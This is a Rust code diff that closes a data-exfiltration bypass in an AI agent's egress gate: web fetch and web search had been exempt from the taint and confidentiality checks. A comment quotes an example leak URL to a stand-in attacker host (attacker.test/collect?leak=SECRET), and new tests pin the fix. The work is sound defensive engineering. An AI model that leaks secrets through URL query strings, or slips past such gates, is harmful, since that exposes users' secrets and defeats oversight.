@@ -79,7 +79,15 @@ pub fn sink_max_conf_for(op: Operation) -> ConfLevel {
         Operation::GitPush
         | Operation::CreatePr
         | Operation::SpawnAgent
-        | Operation::ManagePods => ConfLevel::Internal,
+        | Operation::ManagePods
+        // WebFetch/WebSearch send an agent-chosen URL to an external server, and
+        // a URL carries a query string. That is data crossing the trust boundary
+        // — the exact criterion this function's own docstring states — so their
+        // omission left the check inert: `ConfLevel` tops out at `Secret`, so a
+        // `Secret` cap can never be exceeded and `session_exfiltration_check`
+        // could never fire for them.
+        | Operation::WebFetch
+        | Operation::WebSearch => ConfLevel::Internal,
         _ => ConfLevel::Secret,
     }
 }
@@ -90,10 +98,42 @@ pub fn sink_max_conf_for(op: Operation) -> ConfLevel {
 /// confidentiality ceiling exceeds what the sink may emit (secret exfiltration).
 /// `None` ⇒ the gate falls through to the normal decision path.
 pub fn ifc_egress_denial(flow: &FlowTracker, op: Operation, kind: NodeKind) -> Option<String> {
-    if kind != NodeKind::OutboundAction {
+    // An operation is an egress point if the kernel classifies its flow node as
+    // an outbound action, OR if its sink class can move data out of the trust
+    // boundary.
+    //
+    // The second clause fixes a real bypass. `node_kind_for` maps `WebFetch` and
+    // `WebSearch` to `NodeKind::WebContent` — correct, they ingest — but the
+    // gate used to return early for any kind that was not `OutboundAction`, so
+    // BOTH checks below were skipped for them. Meanwhile
+    // `default_sink_class(WebFetch)` is `HTTPEgress`, whose `is_exfil_vector()`
+    // is `true`: nucleus called web fetch an exfiltration vector in one file and
+    // exempted it from the exfiltration gate in another.
+    //
+    // Measured before the fix: in a session already tainted by web content,
+    // `WebFetch("https://attacker.test/collect?leak=SECRET")` was ALLOWED under a
+    // permissive lattice, while a local `WriteFiles` was denied — the more direct
+    // exfiltration channel was the one left open. A restrictive lattice happened
+    // to refuse it, but on capability grounds (`WebFetch@LowRisk exceeds Never`),
+    // which is incidental: a pod only becomes tainted by fetching web content, so
+    // the pods at risk are exactly the ones with `WebFetch` enabled and the
+    // capability gate silent.
+    //
+    // A URL carries a query string, so this is a data-carrying channel and
+    // belongs to the same gate as every other one.
+    let is_outbound_action = kind == NodeKind::OutboundAction;
+    let carries_data_out =
+        is_outbound_action || crate::capability::default_sink_class(op).is_exfil_vector();
+    if !carries_data_out {
         return None;
     }
-    if flow.is_tainted() {
+    // INTEGRITY applies only to true outbound ACTIONS. A web fetch is an ingest:
+    // it reads more adversarial content into a session that is already
+    // adversarially tainted, which adds no integrity the session lacks. Denying
+    // it on this axis would end multi-page research after the first page and buy
+    // nothing — the instinct behind `tainted_session_allows_web_fetch` is right
+    // on this axis, even though its stated reason was mechanical.
+    if is_outbound_action && flow.is_tainted() {
         return Some(format!(
             "session carries adversarial integrity (untrusted/web content was \
              observed); outbound operation {op:?} blocked to prevent exfiltration \
@@ -638,6 +678,118 @@ mod graded_taint_tests {
             Operation::GrepSearch,
         ] {
             assert_eq!(graded_taint_response(op), TaintResponse::Allow, "{op:?}");
+        }
+    }
+}
+
+#[cfg(test)]
+mod web_egress_bypass_tests {
+    use super::*;
+    use portcullis_core::flow::NodeKind;
+    use portcullis_core::ifc_api::FlowTracker;
+
+    /// Adversarial integrity only — the ordinary research session.
+    fn tainted() -> FlowTracker {
+        let mut f = FlowTracker::new();
+        f.observe(NodeKind::WebContent)
+            .expect("observe web content");
+        f
+    }
+
+    /// A session that has read secrets.
+    fn secret_bearing() -> FlowTracker {
+        let mut f = FlowTracker::new();
+        f.observe(NodeKind::Secret).expect("observe a secret");
+        f
+    }
+
+    /// **The bypass, pinned on the axis that matters.** A session holding secrets
+    /// must not put them in a URL. Before the fix this was unreachable twice
+    /// over: `ifc_egress_denial` returned early for any kind that was not
+    /// `OutboundAction`, and even had it not, `sink_max_conf_for(WebFetch)` was
+    /// `Secret` — the top of the lattice — so the ceiling could never be exceeded.
+    #[test]
+    fn a_secret_bearing_session_cannot_fetch_a_url() {
+        let flow = secret_bearing();
+        let kind = NodeKind::WebContent; // what node_kind_for(WebFetch) returns
+        assert!(
+            ifc_egress_denial(&flow, Operation::WebFetch, kind).is_some(),
+            "a secret-bearing session must not send an agent-chosen URL outbound"
+        );
+        assert!(
+            ifc_egress_denial(&flow, Operation::WebSearch, kind).is_some(),
+            "web search is the same channel"
+        );
+    }
+
+    /// The counterpart, and the reason the fix is two-axis rather than blunt: a
+    /// session tainted by web content but holding no secrets may keep fetching.
+    /// Reading page 2 adds no integrity the session has already lost, and denying
+    /// it would end multi-page research for no security gain.
+    #[test]
+    fn a_tainted_but_secretless_session_may_still_fetch() {
+        let flow = tainted();
+        assert!(
+            ifc_egress_denial(&flow, Operation::WebFetch, NodeKind::WebContent).is_none(),
+            "integrity taint alone must not stop further reading"
+        );
+    }
+
+    /// The two axes must genuinely differ, or the split above is decoration:
+    /// under the SAME integrity taint an outbound ACTION is refused while an
+    /// ingest is not.
+    #[test]
+    fn integrity_stops_actions_while_confidentiality_stops_egress() {
+        let flow = tainted();
+        assert!(
+            ifc_egress_denial(&flow, Operation::WriteFiles, NodeKind::OutboundAction).is_some(),
+            "an outbound action under taint is still refused"
+        );
+        assert!(
+            ifc_egress_denial(&flow, Operation::WebFetch, NodeKind::WebContent).is_none(),
+            "an ingest under the same taint is not"
+        );
+    }
+
+    /// Reads carry nothing out and stay available under both conditions —
+    /// without this, the denials above could be a gate that refuses everything.
+    #[test]
+    fn reads_stay_available() {
+        for flow in [tainted(), secret_bearing()] {
+            for op in [
+                Operation::ReadFiles,
+                Operation::GlobSearch,
+                Operation::GrepSearch,
+            ] {
+                assert!(
+                    ifc_egress_denial(&flow, op, NodeKind::FileRead).is_none(),
+                    "{op:?} moves no data out and must remain available"
+                );
+            }
+        }
+    }
+
+    /// A clean session may fetch — the denial must come from session state, not
+    /// from the operation being newly forbidden outright.
+    #[test]
+    fn a_clean_session_may_still_fetch() {
+        let flow = FlowTracker::new();
+        assert!(
+            ifc_egress_denial(&flow, Operation::WebFetch, NodeKind::WebContent).is_none(),
+            "fetching is gated by session state, not banned"
+        );
+    }
+
+    /// `sink_max_conf_for` must actually cap web egress below the top of the
+    /// lattice. At `Secret` the check is inert, which is how the hole survived.
+    #[test]
+    fn web_egress_is_capped_below_the_top_of_the_lattice() {
+        for op in [Operation::WebFetch, Operation::WebSearch] {
+            assert!(
+                sink_max_conf_for(op) < ConfLevel::Secret,
+                "{op:?} capped at {:?}: a Secret cap can never be exceeded",
+                sink_max_conf_for(op)
+            );
         }
     }
 }
